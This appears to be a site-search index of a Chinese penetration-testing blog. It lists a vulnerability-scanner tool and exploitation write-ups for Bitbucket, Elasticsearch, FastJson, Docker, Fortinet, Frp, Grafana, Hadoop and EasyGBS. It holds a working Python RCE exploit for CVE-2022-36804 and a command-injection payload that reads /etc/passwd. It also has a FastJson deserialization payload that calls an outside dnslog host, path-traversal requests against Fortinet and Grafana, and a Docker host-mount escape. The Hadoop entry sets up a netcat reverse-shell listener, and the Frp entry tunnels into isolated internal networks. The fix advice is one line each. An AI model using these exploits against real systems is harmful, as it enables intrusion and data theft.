<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Capricorn</title>
    <url>/pages/MyTools/Capricorn.html</url>
    <content><![CDATA[<h1 id="Capricorn">1. Capricorn</h1><p>Capricorn（摩羯）一款基于wxpython的GUI图形化检测工具，包含了基础的备忘录，基础加解密，批量漏洞和单项漏洞检测功能，也支持railgun与fscan的联动。</p>
<p>使用前需点击设置-修改配置文件，更改fscan和railgun的路径地址才能正常使用</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221118153048507.png" alt="image-20221118153048507"></p>
<h1 id="目前支持检测下列漏洞">2. 目前支持检测下列漏洞</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alibaba Nacos 未授权访问漏洞</span><br><span class="line">Apache Hadoop RCE</span><br><span class="line">Apache HTTPd CVE-2021-41773</span><br><span class="line">Apache HTTPd CVE-2021-42013</span><br><span class="line">Apache Tomcat CVE-2017-12615</span><br><span class="line">Atlassian Bitbucket Server远程命令执行CVE-2022-36804</span><br><span class="line">ElasticSearch CVE-2015-1427</span><br><span class="line">ElasticSearch CVE-2014-3120</span><br><span class="line">Fortinet RCE CVE-2022-40684</span><br><span class="line">GLPI htmLawedTest.php远程命令执行漏洞CVE-2022-35914</span><br><span class="line">Hikvision身份认证绕过</span><br><span class="line">Nexus CVE-2019-7238</span><br><span class="line">M7S任意文件读取</span><br><span class="line">Metabase 任意文件读取CVE-2021-41277</span><br><span class="line">Omnia MPX文件读取漏洞CVE-2022-36642</span><br><span class="line">Spring4shell远程代码执行CVE-2022-22965</span><br><span class="line">Spring未授权访问漏洞</span><br><span class="line">Struts2-061</span><br><span class="line">Teleport堡垒机do-login任意用户登录漏洞</span><br><span class="line">TerraMaster TOS 信息泄漏+RCE CVE-2022-24990</span><br><span class="line">VMware vCenter vid 任意文件读取漏洞</span><br><span class="line">Weblogic CVE-2020-14882</span><br><span class="line">Webmin CVE-2019-15107</span><br><span class="line">YApi RCE</span><br><span class="line">孚盟云AjaxMethod.ashx SQL注入</span><br><span class="line">安恒明御WEB应用防火墙report.php任意用户登录</span><br><span class="line">大华城市安防监控系统平台管理任意文件下载漏洞</span><br><span class="line">迪普VPN任意文件读取漏洞</span><br><span class="line">泛微E-Cology HrmCareerApplyPerView.jsp SQL注入</span><br></pre></td></tr></table></figure>

<h1 id="安装">3. 安装</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">下载地址:</span><br><span class="line">https://www.aliyundrive.com/s/wUdBmkJgJWb</span><br><span class="line"></span><br><span class="line">python3 -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<h1 id="启动">4. 启动</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 main.py</span><br></pre></td></tr></table></figure>

<h1 id="二次开发">5. 二次开发</h1><p>1、可以修改main.py文件进行二开，通过增加screen_vul列表框增加GUI界面漏洞选项</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221110093246533.png" alt="image-20221110093246533"></p>
<p>2、将exp或poc放入poc包下，将结果return返回，正常检测带url参数即可，RCE漏洞则增加cmd参数</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221110093400172.png" alt="image-20221110093400172"></p>
<p>3、通过import将poc的漏洞模块导入</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221110093619867.png" alt="image-20221110093619867"></p>
<p>4、修改execute方法，if判断第一步增加的screen_vul的漏洞名称，即可使用</p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221110093751077.png" alt="image-20221110093751077"></p>
<h1 id="联系方式">6. 联系方式</h1><p>如果有问题或者bug可以通过VX qiwentaid1与我联系</p>
]]></content>
      <categories>
        <category>MyTools</category>
      </categories>
  </entry>
  <entry>
    <title>EasyGBS</title>
    <url>/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/EasyGBS.html</url>
    <content><![CDATA[<h1 id="EasyGBS未授权访问">1. EasyGBS未授权访问</h1><h2 id="风险描述">1.1. 风险描述:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者可以直接访问平台的API接口文档，从而获取系统的API接口造成信息泄露。再通过泄露的账号密码登录到EasyGBS后台。</span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现">1.2. 漏洞复现:</h2><p><img src="https://s2.loli.net/2022/07/20/cWCPnp1HkDI8TFx.png" alt="image-20220720125708082"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问下面API接口网址获取登录账号密码</span><br><span class="line">/api/v1/userlist?pageindex=0&amp;pagesize=10</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/20/kUiXEVRHJsbLxI7.png" alt="image-20220720124835234"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过burp抓包发现用户名密码为GET方式传参，修改成正确的用户名和password即可登录。</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/20/2SEonP4iaekRu6Q.png" alt="image-20220720125958474"></p>
<p><img src="https://s2.loli.net/2022/07/20/uWcxLNgviEYAh7Q.png" alt="image-20220720124649601"></p>
<h4 id="修复建议">1.2.0.1. 修复建议:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、禁止API接口未授权访问。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>网络设备</category>
      </categories>
  </entry>
  <entry>
    <title>Atlassian-Bitbucket</title>
    <url>/pages/WEB%E5%BA%94%E7%94%A8/Atlassian-Bitbucket-Server.html</url>
    <content><![CDATA[<h1 id="Atlassian-Bitbucket-Server">1. Atlassian Bitbucket Server</h1><h2 id="CVE-2022-36804">1.1. CVE-2022-36804</h2><h3 id="漏洞描述">1.1.1. 漏洞描述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Atlassian 发布安全公告，披露了 Bitbucket Server 和 Data Center 在 7.0.0 版中引入了一个严重安全漏洞。官方漏洞公告中描述 Bitbucket Server 和 Data Center 多个 API 端点存在命令注入漏洞，漏洞触发条件是攻击者具备公开项目的访问权限或者私有项目的可读权限，影响版本从 7.0 到 8.3</span><br></pre></td></tr></table></figure>

<h3 id="影响版本">1.1.2. 影响版本</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Atlassian Bitbucket 7.0～8.3</span><br></pre></td></tr></table></figure>

<h3 id="漏洞复现">1.1.3. 漏洞复现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、需要存在未授权访问,如下图所示</span><br><span class="line">http://xxx/repos?visibility=public</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220921220157561.png" alt="image-20220921220157561"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2、记住下图链接地址</span><br><span class="line">https://xxx/projects/OIT/repos/heroku-buildpack-python/browse</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220921220715799.png" alt="image-20220921220715799"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3、将下面poc &#123;projects&#125;部分替换成步骤2的 projects/OIT/repos/heroku-buildpack-python</span><br><span class="line"></span><br><span class="line">/rest/api/latest/&#123;projects&#125;/archive?filename=wN3Am&amp;at=wN3Am&amp;path=wN3Am&amp;prefix=ax%00--exec=%60id%60%00--remote=origin</span><br><span class="line"></span><br><span class="line">/archive?filename=kiE0h&amp;at=kiE0h&amp;path=kiE0h&amp;prefix=ax%00--exec=%60cat%20etc%2fpasswd%60%00--remote=origin</span><br><span class="line">/archive?filename=kiE0h&amp;at=kiE0h&amp;path=kiE0h&amp;prefix=ax%00--exec=%60pwd%60%00--remote=origin</span><br><span class="line">/archive?filename=kiE0h&amp;at=kiE0h&amp;path=kiE0h&amp;prefix=ax/%00--help%00--%00--remote=origin</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220921223556248.png" alt="image-20220921223556248"></p>
<h3 id="EXP">1.1.4. EXP</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">main</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetArgv</span>(<span class="params">self</span>):</span><br><span class="line">        parse = argparse.ArgumentParser()</span><br><span class="line">        parse.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Remote Target URL&quot;</span>, dest=<span class="string">&quot;url&quot;</span>)</span><br><span class="line">        parse.add_argument(<span class="string">&quot;-cmd&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;id&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Execute Command&quot;</span>, dest=<span class="string">&quot;cmd&quot;</span>)</span><br><span class="line">        arg = parse.parse_args()  <span class="comment"># 解析参数</span></span><br><span class="line">        <span class="keyword">return</span> arg</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Exp</span>(<span class="params">self, url, cmd</span>):</span><br><span class="line">        test_url = <span class="string">f&#x27;<span class="subst">&#123;url&#125;</span>repos?visibility=public&#x27;</span></span><br><span class="line">        resp = requests.get(test_url, headers=headers).text</span><br><span class="line">        title = re.findall(<span class="string">&#x27;&lt;title&gt;(.*?)&lt;/title&gt;&#x27;</span>, resp)</span><br><span class="line">        vul_url = re.findall(<span class="string">&#x27;,&quot;self&quot;:\[\&#123;&quot;href&quot;:&quot;(.*?)/browse&quot;&#125;]&#125;&#125;&#x27;</span>, resp)</span><br><span class="line">        <span class="keyword">if</span> title[<span class="number">0</span>] == <span class="string">&#x27;Public Repositories - Bitbucket&#x27;</span>:</span><br><span class="line">            projects = vul_url[<span class="number">0</span>].split(url,<span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line">            POC = <span class="string">f&#x27;rest/api/latest/<span class="subst">&#123;projects&#125;</span>/archive?filename=wN3Am&amp;at=wN3Am&amp;path=wN3Am&amp;prefix=ax%00--exec=%60<span class="subst">&#123;cmd&#125;</span>%60%00--remote=origin&#x27;</span></span><br><span class="line">            result = requests.get(url=<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span><span class="subst">&#123;POC&#125;</span>&#x27;</span>,headers=headers)</span><br><span class="line">            final_result = re.findall(<span class="string">&#x27;1: (.*?):&#x27;</span>, result.text)</span><br><span class="line">            <span class="keyword">if</span> result.status_code == <span class="number">500</span>:</span><br><span class="line">                <span class="built_in">print</span>(final_result[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = main().GetArgv()</span><br><span class="line">    exp = main().Exp(url=parser.url,cmd=parser.cmd)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20221005201329446.png" alt="image-20221005201329446"></p>
]]></content>
      <categories>
        <category>WEB应用</category>
      </categories>
  </entry>
  <entry>
    <title>Elasticsearch</title>
    <url>/pages/%E6%95%B0%E6%8D%AE%E5%BA%93/Elasticsearch.html</url>
    <content><![CDATA[<h1 id="Elasticsearch未授权访问">1. Elasticsearch未授权访问</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Elasticsearch是一款java编写的企业级搜索服务。越来越多的公司使用ELK作为日志分析，启动此服务默认会开放9200端口，可被非法操作数据</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/06/wy3UbJSEjdWCFHP.png" alt="image-20220706110218953"></p>
<h2 id="漏洞验证：">1.2. 漏洞验证：</h2><p><code>访问x.x.x.x:9200发现下图页面</code></p>
<p><img src="https://s2.loli.net/2022/07/06/XTgVnKO6NGoWUyq.png" alt="image-20220706110427054.png"></p>
<h3 id="Linux">1.2.1. Linux</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/360EntSecGroup-Skylar/ElasticHD/releases/download/1.4/elasticHD_linux_amd64.zip // 下载ElasticHD安装包</span><br><span class="line">unzip elasticHD_linux_amd64.zip // 解压</span><br><span class="line">chmod 777 ElasticHD // 修改权限</span><br><span class="line">exec ./ElasticHD -p 127.0.0.1:9800 // 执行，若执行无效找到 ElasticHD 文件直接打开即可</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/06/ixsTrOj916XVgkH.png" alt="image-20220706155751271"></p>
<h3 id="windows">1.2.2. windows</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、下载工具https://github.com/qax-os/ElasticHD/releases/download/1.4/elasticHD_windows_amd64.zip</span><br><span class="line">2、ElasticHD.exe -p 127.0.0.1:9800</span><br><span class="line"></span><br><span class="line">下面打开本地连接，输入未授权访问的地址即可。</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220905160348282.png" alt="image-20220905160348282"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220905160556247.png" alt="image-20220905160556247"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220905160625803.png" alt="image-20220905160625803"></p>
<h2 id="漏洞利用：">1.3. 漏洞利用：</h2><p>这里使用Elasticdump进行节点数据下载查看，这里推荐安装npm进行下载</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">node -v</span><br><span class="line">npm -v</span><br><span class="line">确保环境存在</span><br><span class="line"></span><br><span class="line">npm install elasticdump，安装elasticdump，全局搜索一下安装成功的目录，可以把他添加到环境变量中</span><br><span class="line"></span><br><span class="line">elasticdump --input=http://xxxx:8120/节点名称 --output=F:\dm_entity_expert_info.json --limit 10000</span><br></pre></td></tr></table></figure>

<h2 id="漏洞修复：">1.4. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、开启身份验证，防止未经授权用户访问。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>数据库</category>
      </categories>
  </entry>
  <entry>
    <title>FastJson</title>
    <url>/pages/WEB%E6%A1%86%E6%9E%B6/Fastjson.html</url>
    <content><![CDATA[<h1 id="FastJson反序列化漏洞">1. FastJson反序列化漏洞</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastjson是啊里巴巴的的开源库，用于对JSON格式的数据进行解析和打包，fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用：">1.2. 漏洞利用：</h2><p>可以通过burp插件FastJsonScan实现被动扫描检测。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;x&quot;:			&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;com.mysql.jdbc.JDBC4Connection&quot;,&quot;hostToConnectTo&quot;:&quot;wq122qedk25rwzt.fwxxn1.dnslog.cn&quot;,&quot;portToConnectTo&quot;:80,&quot;info&quot;:&#123;&quot;user&quot;:&quot;root&quot;,&quot;password&quot;:&quot;ubuntu&quot;,&quot;useSSL&quot;:&quot;false&quot;,&quot;statementInterceptors&quot;:&quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;,&quot;autoDeserialize&quot;:&quot;true&quot;&#125;,&quot;databaseToConnectTo&quot;:&quot;mysql&quot;,&quot;url&quot;:&quot;&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20230416091752822.png" alt="image-20230416091752822"></p>
<h2 id="漏洞修复：">1.3. 漏洞修复：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、将fastjson升级至最新版本。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>WEB框架</category>
      </categories>
  </entry>
  <entry>
    <title>Docker</title>
    <url>/pages/%E4%BA%91%E6%94%BB%E9%98%B2/Docker.html</url>
    <content><![CDATA[<h1 id="Docker未授权访问">1. Docker未授权访问</h1><p> <code>fofa查询: banner=&quot;docker&quot; &amp;&amp; port=&quot;2375&quot;</code></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220907123212722.png" alt="image-20220907123212722"></p>
<h2 id="漏洞描述">1.1. 漏洞描述:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Docker是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的LINUX机器上，也可以实现虚拟化，Docker Remote API 是一个取代远程命令行界面（rcli）的REST API。Docker Remote API如配置不当可导致未授权访问。</span><br></pre></td></tr></table></figure>

<h2 id="漏洞危害：">1.2. 漏洞危害：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者利用 docker client 或者 http 直接请求就可以访问这个 API，并且可以执行Docker命令。</span><br></pre></td></tr></table></figure>

<h2 id="漏洞验证">1.3. 漏洞验证:</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xxx.xxx:2375/version</span><br><span class="line">docker -H tcp://x.x.x.x:2375 ps </span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220907124059370.png" alt="image-20220907124059370"></p>
<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/image-20220926093302948.png" alt="image-20220926093302948"></p>
<h2 id="漏洞利用">1.4. 漏洞利用:</h2><p><a href="https://blog.csdn.net/qq_45746286/article/details/128927573">利用文章</a><code>https://blog.csdn.net/qq_45746286/article/details/128927573</code></p>
<p>写入密钥免密登录</p>
<p><code>docker -H tcp://ip:2375 run -it -v /:/mnt image_id /bin/bash</code></p>
]]></content>
      <categories>
        <category>云攻防</category>
      </categories>
  </entry>
  <entry>
    <title>Fortinet</title>
    <url>/pages/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Fortinet.html</url>
    <content><![CDATA[<h1 id="CVE-2018-13379">1. CVE-2018-13379</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession </span><br></pre></td></tr></table></figure>

<h1 id="CVE-2022-40684">2. CVE-2022-40684</h1>]]></content>
      <categories>
        <category>网络设备</category>
      </categories>
  </entry>
  <entry>
    <title>Frp</title>
    <url>/pages/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/Frp%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html</url>
    <content><![CDATA[<h3 id="Frp内网穿透">0.0.1. Frp内网穿透</h3><h4 id="概念">0.0.1.1. 概念</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。</span><br></pre></td></tr></table></figure>

<h4 id="使用环境">0.0.1.2. 使用环境:</h4><ul>
<li><input disabled type="checkbox"> 公网服务器1台（必备）,内网服务器1台</li>
<li><input disabled type="checkbox"> frp工具</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">云上服务器 : x.x.x.x（centos）</span><br><span class="line">目标服务器 : x.x.x.x（windows 10）</span><br><span class="line"></span><br><span class="line">选择对应版本安装frp,对应各平台的amd64版本</span><br><span class="line">https://github.com/fatedier/frp/releases</span><br></pre></td></tr></table></figure>

<h5 id="服务器端配置">0.0.1.2.1. 服务器端配置:</h5><p><code>vi frps.ini</code>修改服务器配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"># frp监听的端口，默认是7000，可以改成其他的</span><br><span class="line">bind_port = 7000</span><br><span class="line"># 授权码</span><br><span class="line">token = frps  </span><br></pre></td></tr></table></figure>

<p><code>./frps -c frps.ini</code> &#x2F;&#x2F; 启动frp服务端服务</p>
<p><img src="https://s2.loli.net/2022/07/28/vTkbyrSM5UVpXRh.png" alt="image-20220728181429331"></p>
<h5 id="客户端配置">0.0.1.2.2. 客户端配置:</h5><p><code>vi frpc.ini</code>修改客户端配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = x.x.x.x	#替换成服务器IP</span><br><span class="line">server_port = 7000	#与服务器的监听端口相同</span><br><span class="line"></span><br><span class="line">[ssh] # 可以加可不加</span><br><span class="line">type = tcp</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 22</span><br><span class="line">remote_port = 6000</span><br><span class="line"></span><br><span class="line">[sock]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 7501</span><br><span class="line">user_encryption = true</span><br><span class="line">user_compression = true</span><br><span class="line">plugin = sock5</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/08/15/L7pqDjTwiM32XSu.png" alt="image-20220815122103071"></p>
<p><code>frpc.exe -c frpc.ini</code> &#x2F;&#x2F; 启动frp客户端服务</p>
<p><img src="https://s2.loli.net/2022/07/28/I4iLsRKSu6wUPTx.png" alt="image-20220728181458660"></p>
<h5 id="后台运行（linux）">0.0.1.2.3. 后台运行（linux）:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//服务端</span><br><span class="line">nohup ./frps -c frps.ini &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line"></span><br><span class="line">//客户端</span><br><span class="line">nohup ./frpc -c ./frpc.ini &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p>停止:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//先找到这个进程</span><br><span class="line">ps -aux|grep frp| grep -v grep</span><br><span class="line">root      3600  0.1  0.1 110188  9484 pts/0    Sl   15:04   0:00 ./frpc -c ./frpc.ini</span><br><span class="line">//杀死进程</span><br><span class="line">kill -9 3600</span><br></pre></td></tr></table></figure>

<h4 id="ssh远程连接">0.0.1.3. ssh远程连接:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh 用户名@云服务器IP -p 6000</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/28/tq2anC8Y3ANBvbH.png" alt="image-20220728181712375"></p>
<p><img src="https://s2.loli.net/2022/07/28/N2vj3qSAcEfr6QH.png" alt="image-20220728181730339"></p>
<h4 id="sock5突破隔离内网：">0.0.1.4. sock5突破隔离内网：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用proxifier软件进行sock5代理</span><br><span class="line">1、代理服务器地址设置成VPS地址</span><br><span class="line">2、代理规则动作设置成代理服务器，目标主机设置成自己想访问的内网网段</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/08/15/SGFc5BmDU8tLxk6.png" alt="image-20220815204933978"></p>
<p><img src="https://s2.loli.net/2022/08/15/UgRt2LpVfi1Dq4w.png" alt="image-20220815205243791"></p>
<p>3、实现访问强隔离内网</p>
<p><img src="https://s2.loli.net/2022/08/15/B5dMSZ3vuakHIt1.png" alt="image-20220815145615545"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
  </entry>
  <entry>
    <title>Grafana</title>
    <url>/pages/%E4%BA%91%E6%94%BB%E9%98%B2/Grafana.html</url>
    <content><![CDATA[<h1 id="Grafana-8-x-任意文件读取">1. Grafana 8.x 任意文件读取</h1><h2 id="漏洞原理">1.1. 漏洞原理:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">该漏洞是由插件模块引起的，该模块能够提供插件文件夹内的静态文件。但是对于检查锁定，攻击者可以使用../从插件文件夹升级到父文件夹并下载任意文件。</span><br></pre></td></tr></table></figure>

<h2 id="影响版本">1.2. 影响版本:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8.0.0-beta1 &lt;= Grafana &lt;= 8.3.0</span><br></pre></td></tr></table></figure>

<h2 id="环境搭建">1.3. 环境搭建:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">靶机: ubuntu 192.168.179.134</span><br><span class="line">		</span><br><span class="line">靶机部署:</span><br><span class="line">cd vulhub/grafana/CVE-2021-43798</span><br><span class="line">sudo docker-compose up -d // 开启环境</span><br><span class="line">访问靶机3000端口，出现下图页面即搭建完成</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/11/Ywe7qFNBx1htvi3.png" alt="image-20220711135552251"></p>
<h2 id="漏洞复现">1.4. 漏洞复现:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、要利用该漏洞，首先需要知道一个有效的插件 id，例如alertlist，以下是一些常见的插件 id：</span><br><span class="line"></span><br><span class="line">alertlist</span><br><span class="line">cloudwatch</span><br><span class="line">dashlist</span><br><span class="line">elasticsearch</span><br><span class="line">graph</span><br><span class="line">graphite</span><br><span class="line">heatmap</span><br><span class="line">influxdb</span><br><span class="line">mysql</span><br><span class="line">opentsdb</span><br><span class="line">pluginlist</span><br><span class="line">postgres</span><br><span class="line">prometheus</span><br><span class="line">stackdriver</span><br><span class="line">table</span><br><span class="line">text</span><br><span class="line"></span><br><span class="line">2、发送以下请求以检索/etc/passwd（可以将 alertlist 替换为任何有效的插件 id）:</span><br><span class="line">/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/11/I5E3OZmMDpCP6zS.png" alt="image-20220711140913715"></p>
<p>漏洞修复:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、官方已更新到V8.3.1版本，对漏洞进行了修复。</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>云攻防</category>
      </categories>
  </entry>
  <entry>
    <title>Hadoop</title>
    <url>/pages/WEB%E5%BA%94%E7%94%A8/Hadoop.html</url>
    <content><![CDATA[<h1 id="hadoop未授权访问">1. hadoop未授权访问</h1><h2 id="风险描述：">1.1. 风险描述：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Hadoop YARN 提供有默认开放在8088和8090的 REST API（默认前者）允许用户直接通过 API 进行相关的应用创建、任务提交执行等操作，如果配置不当，REST API 将会开放在公网导致未授权访问的问题，那么任何黑客则就均可利用其进行远程命令执行，从而进行挖矿等行为。</span><br></pre></td></tr></table></figure>

<p>More info : 该服务默认开放端口50070，未授权端口8088</p>
<h2 id="环境搭建：">1.2. 环境搭建：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者：kali 192.168.179.129</span><br><span class="line">靶机：ubuntu 192.168.179.130 -- 需要安装 vulhub 环境</span><br><span class="line">		</span><br><span class="line">		靶机部署：</span><br><span class="line">		pip install docker-compose</span><br><span class="line">		git clone https://github.com/vulhub/vulhub.git // 安装 vulhub 环境</span><br><span class="line">		cd vulhub/hadoop/unauthorized-yarn // 进入环境目录</span><br><span class="line">		sudo docker-compose up -d // 启动环境</span><br></pre></td></tr></table></figure>

<p><img src="https://qwtd-image.oss-cn-hangzhou.aliyuncs.com/img/e5Yks3aDljJHAXt.png" alt="image-20220706094141516"></p>
<h2 id="复现过程：">1.3. 复现过程：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">访问x.x.x.x:50070发现下图页面</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/05/P1JgfCYRadre2kE.png" alt="image-20220705143102545"></p>
<p>More info : 访问到该网页也算未授权访问，vulhub环境不会开启该端口页面</p>
<h4 id="漏洞利用：">1.3.0.1. 漏洞利用：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 9999 // 开启监听9999端口</span><br><span class="line">python3 exp.py // 利用下方代码生成exp.py文件并执行</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2022/07/06/mI3WLp46CtSAQ5J.png" alt="hadoop.png"></p>
